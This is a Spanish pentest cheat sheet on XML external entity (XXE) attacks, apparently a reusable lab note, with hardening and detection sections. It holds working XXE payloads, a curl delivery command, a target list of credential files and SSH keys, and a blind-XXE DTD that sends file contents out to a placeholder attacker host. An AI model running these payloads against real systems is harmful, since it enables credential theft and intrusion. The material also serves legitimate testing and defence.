---
topic: xxe
tags: [web, xml, xxe, file-read]
---

# XXE — lectura de ficheros por entidades XML

[🇬🇧 English](xxe.en.md) | **Español**

> Nota reutilizable. No publicar salidas con credenciales reales.

## Idea

Si un parser resuelve entidades externas, cualquier XML que llegue a él se convierte en una lectura de ficheros, y con `expect://` o SSRF, en ejecución o movimiento lateral. Sigue vivo en `lxml`, en parsers Java con `DocumentBuilderFactory` sin endurecer y en endpoints "de subida" que aceptan XML.

## Detección

Cualquier campo que acepte XML: feeds, importadores, SAML, SOAP, `.svg`, `.docx`/`.xlsx` (son ZIP con XML dentro), APIs "AIDX/EDIFACT" y validadores de tickets.

```bash
# ¿el parser resuelve entidades?
'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "TEST">]><r>&x;</r>'   # si devuelve TEST, hay XXE clásico
```

## Payload base

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

```bash
curl -s -X POST http://<HOST>/feeds/aidx -H 'Content-Type: application/xml' \
     --data-binary @payload.xml
```

## Objetivos de lectura, por orden

| Ruta | Qué da |
|---|---|
| `/etc/passwd` | usuarios válidos para SSH/su |
| `/etc/hostname`, `/etc/os-release` | contexto |
| `~/.ssh/id_rsa` | clave privada |
| `~/.ssh/authorized_keys` | quién puede entrar |
| `/etc/nginx/sites-enabled/*`, `vhosts` | vhosts ocultos |
| `/var/www/html/wp-config.php`, `.env`, `config.php` | credenciales de BD |
| `/opt/*/config/*.properties`, `server.properties`, `application.yml` | click de servicios |
| `/proc/self/cmdline`, `/proc/self/environ` | argumentos y variables del proceso |
| `http://169.254.169.254/...` | metadatos cloud (SSRF) |

En pipelines de datos, el fichero clave suele ser el del broker o el del propio servicio de ingesta: ahí están las credenciales SASL/SQL reutilizadas.

## Variantes

- **Con `file://` bloqueado pero sin filtro real**: probar `php://filter/convert.base64-encode/resource=index.php`.
- **UTF-16**: añadir BOM (`FF FE`) y guardar el XML en UTF-16 rompe muchos filtros por bytes. Con Burp: *Convert to UTF-16*.
- **Sin reflejo (blind XXE)**: DTD externo + parámetro entities, exfiltración por HTTP o FTP a tu listener:
  ```xml
  <!DOCTYPE r [<!ENTITY % f SYSTEM "http://<ATACANTE>/d.dtd"> %f;]>
  ```
  ```dtd
  <!ENTITY % c "<!ENTITY &#x25; e SYSTEM 'file:///etc/passwd'>">
  %c;
  <!ENTITY exfil "<!ENTITY &#x25; s SYSTEM 'http://<ATACANTE>/?x=%e;'>">
  ```
- **Out-of-band con `expect://`** (PHP con la extensión): ejecución directa.
- **DoS**: cuidado con las *billion laughs*; en un lab se entiende, en producción no se hace.

## Blindaje

```python
# lxml
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
```

```java
// Java
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
f.setFeature("http://xml.org/sax/features/external-general-entities", false);
f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
f.setXIncludeAware(false);
```

```php
libxml_disable_entity_loader(true);   // PHP < 8
// PHP 8+: usar XMLReader con LIBXML_NONET y sin LIBXML_NOENT
```

## Detección

- Peticiones con `<!DOCTYPE` o `<!ENTITY` en el cuerpo (regex en el WAF).
- Sondas con `file://`, `php://filter`, `expect://`, `169.254.169.254`.
- Conexiones salientes del servidor web a IPs externas en puertos 80/21/139.

## Referencias

- <https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing>
- <https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html>
- <https://github.com/payloadbox/xxe-injection-payload-list>
